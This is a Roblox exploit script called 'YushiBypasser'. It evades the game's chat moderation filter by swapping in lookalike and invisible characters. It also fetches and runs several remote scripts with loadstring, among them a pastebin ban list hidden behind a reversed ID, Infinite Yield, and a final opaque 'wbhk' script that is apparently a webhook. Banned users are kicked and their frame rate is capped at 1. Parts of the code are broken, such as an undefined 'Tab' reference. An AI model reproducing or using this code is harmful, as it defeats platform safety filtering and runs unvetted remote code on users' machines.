if not game:IsLoaded() then
   game.IsLoaded:Wait()
end

local TableOfData = loadstring(game:HttpGet("https://pastebin.com/raw/" .. string.reverse("tC4TWGVE")))()

for i, v in pairs(TableOfData) do
    if tostring(game:GetService("RbxAnalyticsService"):GetClientId()) == v then
        local plr = game.Players.LocalPlayer
        local screenguibanned = Instance.new("ScreenGui")
        local framebanned = Instance.new("Frame")
        local label = Instance.new("TextLabel")
        screenguibanned.Parent = game.Players.LocalPlayer.PlayerGui
        framebanned.Parent = screenguibanned
        label.Parent = framebanned
        framebanned.BackgroundColor3 = Color3.fromRGB(0,0,0)
        framebanned.Size = UDim2.new(1,0,2,0)
        framebanned.Position = UDim2.new(0,0,-0.2,0)
        label.Text = "You little skid.."
        label.TextSize = 50
        label.Position = UDim2.new(0.5,0,0.35,0)
        label.TextColor3 = Color3.fromRGB(255,255,255)
        task.wait(1.5)
        label.Text = "You have been banned"
        task.wait(1.5)
        label.Text = "skill issue lol :skull:"
        task.wait(2)
        setclipboard("https://discord.gg/rUueCMsgjn")
        if plr then
        game.Players.LocalPlayer:Kick("You have been banned from using josh's scripts ||| Appeal at: https://discord.gg/rUueCMsgjn")
        task.wait(0.5)
        setfpscap(1)
        else
        game:GetService("Players").LocalPlayer:Destroy()
        task.wait(0.5)
        setfpscap(1)
        end
    end
end


game:GetService("StarterGui"):SetCore("SendNotification", {   
   Title = "YushiBypasser";  
    Text = "YushiBypasser will load soon.";  
   Icon = "rbxthumb://type=Asset&id=97203776371665&w=150&h=150"; 
   Duration = 20;
})

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua", true))()

local Window = Rayfield:CreateWindow({  
  Name = "YushiBypasser 0.0",  
  LoadingTitle = "Loading...",  
  LoadingSubtitle = "By TermsOfService426",  
  ConfigurationSaving = {  
     Enabled = true,  
     FolderName = nil,   
     FileName = "Big Hub"  
  },  

  Discord = {  
     Enabled = false,  
     Invite = "noinvitelink",   
     RememberJoins = true   
  },  

  KeySystem = true,  
  KeySettings = {  
     Title = "The Gates",  
     Subtitle = "Key System",  
     Note = "its 001",  
     FileName = "Key",   
     SaveKey = true,  
     GrabKeyFromSite = false,   
     Key = {"001"}   
  }  
})  

Rayfield:Notify({
  Title = "YushiBypasser",
  Content = "YushiBypasser is done Loading, go and have the freedom of speech!",
  Duration = 6.5,
  Image = "check",
})


local MTab = Window:CreateTab("Main", "earth")
local BTab = Window:CreateTab("Bypass", "speech")
local TTab = Window:CreateTab("Trolling", "flame")
local PTab = Window:CreateTab("Phrases", "message-square-text")
local STab = Window:CreateTab("Settings", "settings")
local CTab = Window:CreateTab("Credits", "award")


local player = game.Players.LocalPlayer  

-- Function to generate a color from the HSV color wheel  
local function HSVtoRGB(h, s, v)  
   local r, g, b  
   local i = math.floor(h * 6)  
   local f = h * 6 - i  
   local p = v * (1 - s)  
   local q = v * (1 - f * s)  
   local t = v * (1 - (1 - f) * s)  
   i = i % 6  
   if i == 0 then  
       r, g, b = v, t, p  
   elseif i == 1 then  
       r, g, b = q, v, p  
   elseif i == 2 then  
       r, g, b = p, v, t  
   elseif i == 3 then  
       r, g, b = p, q, v  
   elseif i == 4 then  
       r, g, b = t, p, v  
   elseif i == 5 then  
       r, g, b = v, p, q  
   end  
   return string.format("#%02X%02X%02X", r * 255, g * 255, b * 255)  
end  

-- Function to create a player name with a rainbow effect  
local function createRainbowName(name)  
   local rainbowName = ""  
   for i = 1, #name do  
       local color = HSVtoRGB(i / #name, 1, 1) -- Using relative position for color selection  
       rainbowName = rainbowName .. "<font color='" .. color .. "'>" .. name:sub(i, i) .. "</font>"  
   end  
   return rainbowName  
end  

local playerName = createRainbowName(player.Name) -- Create the rainbow name  
local welcomeMessage = "Welcome, " .. playerName .. "!" -- Full welcome message  

-- Creating the WelcomeParagraph within Rayfield  
local WelcomeParagraph = MTab:CreateParagraph({  
   Title = welcomeMessage, -- This uses the rainbow effect  
   Content = "Welcome to YushiBypasser, your ultimate Bypasser, packed with a wide variety of word to bypass! Crafted with passion, our scripts offer endless possibilities to enhance Freedom of speech. Enjoy, " .. playerName .. "."  
})

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")
local UserInputService = game:GetService("UserInputService")
local bypassText = ""
local safeBool = false
local chatBool = true
local autoBool = false
local tagBool = true
local jerkBool = true


-- Message bypass function and configurations
local StandardMapping = {
  a = "a", b = "b", c = "c", d = "d", e = "e", f = "f", g = "g", h = "h",
  i = "i", j = "j", k = "k", l = "I", m = "m", n = "n", o = "o", p = "p",
  q = "ԛ", r = "r", s = "s", t = "t", u = "u", v = "v", w = "w", x = "x",
  y = "y", z = "z", A = "A", B = "B", C = "C", D = "D", E = "E", F = "F",
  G = "G", H = "H", I = "I", J = "J", K = "К", L = "L", M = "M", N = "N",
  O = "O", P = "P", Q = "Q", R = "R", S = "S", T = "T", U = "U", V = "V",
  W = "W", X = "X", Y = "Y", Z = "Z"
}

local function bypassMessage(message)
  local bypassedMessage = ""
  local wordCount = 0
  
  -- Convert the message with mapping
  for i = 1, #message do
      local char = message:sub(i, i)
      bypassedMessage = bypassedMessage .. (StandardMapping[char] or char)
      
      -- Add fake space every 6 words
      if char == " " then
          wordCount = wordCount + 1
          if wordCount % 6 == 0 then
              bypassedMessage = bypassedMessage .. " "
          end
      end
  end

  -- Introduce fake spaces with special characters
  bypassedMessage = bypassedMessage:gsub(" ", function()
      return math.random(2) == 7 and "" or "" or ""
  end)

  -- Replace fake spaces with real ones every 7th word
  local actualWordCount = 0
  bypassedMessage = bypassedMessage:gsub("[]", function(fakeSpace)
      actualWordCount = actualWordCount + 1
      if actualWordCount % 7 == 0 then
          return " "
      else
          return fakeSpace
      end
  end)

  return bypassedMessage
end

-- Function to send message with the bypass applied
local function sendMessage(message)
  local Chat = game:GetService("Chat")
  local success, filteredMessage = pcall(function()
      return Chat:FilterStringForBroadcast(message, player)
  end)

  if not success then
      warn("Filtering failed. Proceeding without tag detection.")
      filteredMessage = message
  end

  -- Send the message through TextChatService or Legacy chat
  if TextChatService then
      local textChannels = TextChatService:FindFirstChild("TextChannels")
      if textChannels then
          local textChannel = textChannels:WaitForChild("RBXGeneral")
          if textChannel then
              textChannel:SendAsync(message)
              return
          else
              warn("No suitable text channel found.")
          end
      end
  elseif ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then
      ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
  else
      warn("Legacy chat events are not available.")
  end
end


local Input = MTab:CreateInput({
  Name = "Input Your Message",
  CurrentValue = "",
  PlaceholderText = "Enter text here...",
  RemoveTextAfterFocusLost = false,
  Flag = "Input1",
  Callback = function(Text)
       bypassText = Text
  end,
})

local Button = MTab:CreateButton({
  Name = "Send Message",
  Callback = function()
      -- Get the user's message from the input field
      local userMessage = bypassText
      if userMessage and userMessage ~= "" then
          -- Apply bypass and send message
          local bypassedMessage = bypassMessage(userMessage)
          sendMessage(bypassedMessage)
      else
          Rayfield:Notify({
              Title = "Error",
              Content = "Please enter a message to send.",
              Duration = 3,
              Image = "error",
          })
      end
  end,
})



local CustomTheme = {

    TextColor = Color3.fromRGB(240, 240, 240),

    Background = Color3.fromRGB(25, 25, 25),
    Topbar = Color3.fromRGB(34, 34, 34),
    Shadow = Color3.fromRGB(20, 20, 20),

    NotificationBackground = Color3.fromRGB(20, 20, 20),
    NotificationActionsBackground = Color3.fromRGB(230, 230, 230),

    TabBackground = Color3.fromRGB(80, 80, 80),
    TabStroke = Color3.fromRGB(85, 85, 85),
    TabBackgroundSelected = Color3.fromRGB(210, 210, 210),
    TabTextColor = Color3.fromRGB(16, 112, 255),
    SelectedTabTextColor = Color3.fromRGB(50, 50, 50),

    ElementBackground = Color3.fromRGB(35, 35, 35),
    ElementBackgroundHover = Color3.fromRGB(40, 40, 40),
    SecondaryElementBackground = Color3.fromRGB(25, 25, 25),
    ElementStroke = Color3.fromRGB(50, 50, 50),
    SecondaryElementStroke = Color3.fromRGB(40, 40, 40),
            
    SliderBackground = Color3.fromRGB(50, 138, 220),
    SliderProgress = Color3.fromRGB(50, 138, 220),
    SliderStroke = Color3.fromRGB(58, 163, 255),

    ToggleBackground = Color3.fromRGB(30, 30, 30),
    ToggleEnabled = Color3.fromRGB(8, 230, 0),
    ToggleDisabled = Color3.fromRGB(255, 16, 16),
    ToggleEnabledStroke = Color3.fromRGB(8, 230, 0),
    ToggleDisabledStroke = Color3.fromRGB(255, 16, 16),
    ToggleEnabledOuterStroke = Color3.fromRGB(100, 100, 100),
    ToggleDisabledOuterStroke = Color3.fromRGB(65, 65, 65),

    DropdownSelected = Color3.fromRGB(40, 40, 40),
    DropdownUnselected = Color3.fromRGB(30, 30, 30),

    InputBackground = Color3.fromRGB(30, 30, 30),
    InputStroke = Color3.fromRGB(65, 65, 65),
    PlaceholderColor = Color3.fromRGB(16, 112, 255)
}

-- Dropdown for theme selection
local changeTheme = MTab:CreateDropdown({
   Name = "Change Theme", 
   Options = {"Default", "Custom", "Light", "Green", "DarkBlue", "AmberGlow", "Serenity", "Bloom", "Amethyst", "Ocean"},  
   CurrentOption = {"Default"},  
   Flag = "ThemesDropdown",  
   Callback = function(CurrentOption)
       if CurrentOption[1] == "Custom" then
           -- Apply the custom sky blue theme when "Custom" is selected
           Window.ModifyTheme(CustomTheme)

           -- Show a notification that the theme has been changed and to ignore any theme-related errors
           Rayfield:Notify({
               Title = "Theme", 
               Content = "Ignore the error above me about a theme on file, its false.", 
               Duration = 6.5,
               Image = "triangle-alert",  -- Error icon for alert
           })
       else
           -- Apply other themes for other options
           Window.ModifyTheme(CurrentOption[1])
       end
   end
})


local Button = BTab:CreateButton({
  Name = "Button Example",
  Callback = function()
  -- The function that takes place when the button is pressed
  end,
})

local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Function to flash the button background
local function flashButton(button)
    -- Save the original background color of the button
    local originalColor = button.BackgroundColor3

    -- Set the button's background to green for the flash effect
    button.BackgroundColor3 = Color3.fromRGB(0, 255, 0)

    -- Wait for a brief moment (flash duration)
    wait(0.2)

    -- Revert the button's background to the original color
    button.BackgroundColor3 = originalColor
end

-- Create the button with callback and flash effect
local Button = BTab:CreateButton({
    Name = "Button Example",
    Callback = function()
        -- Run the main function inside the callback with error handling
        local success, errorMessage = pcall(function()
            -- Place your main logic here
            print("Button clicked, executing code.")

            -- Flash the button background when clicked
            flashButton(Button)
        end)

        -- If there's an error in the callback, print a warning and do not flash the button
        if not success then
            warn("Error executing button callback: " .. errorMessage)
        end
    end,
})


local Input = BTab:CreateInput({
  Name = "Input Example",
  CurrentValue = "",
  PlaceholderText = "Input Placeholder",
  RemoveTextAfterFocusLost = false,
  Flag = "Input1",
  Callback = function(Text)
  -- The function that takes place when the input is changed
  -- The variable (Text) is a string for the value in the text box
  end,
})

local HttpService = game:GetService("HttpService")

local Button = Tab:CreateButton({
    Name = "Run Script",  -- Button label
    Callback = function()
        -- URL of the script to be loaded
        local url = "https://raw.githubusercontent.com/EdgeIY/infiniteyield/refs/heads/master/source"  -- Replace with the actual URL
        
        -- Make HTTP request to fetch the script
        local success, response = pcall(function()
            return HttpService:GetAsync(url)
        end)

        -- Check if the request was successful
        if success then
            local scriptContent = response

            -- Run the script using loadstring
            local success, result = pcall(function()
                loadstring(scriptContent)()  -- Execute the loaded code
            end)

            -- Handle any errors in the script execution
            if not success then
                warn("Error executing the script: " .. result)
            end
        else
            -- Notify the user if there was an error fetching the script
            warn("Failed to fetch the script from URL: " .. response)
        end
    end,
})



loadstring(game:HttpGet("https://raw.githubusercontent.com/nikoladhima/yb/refs/heads/main/wbhk"))()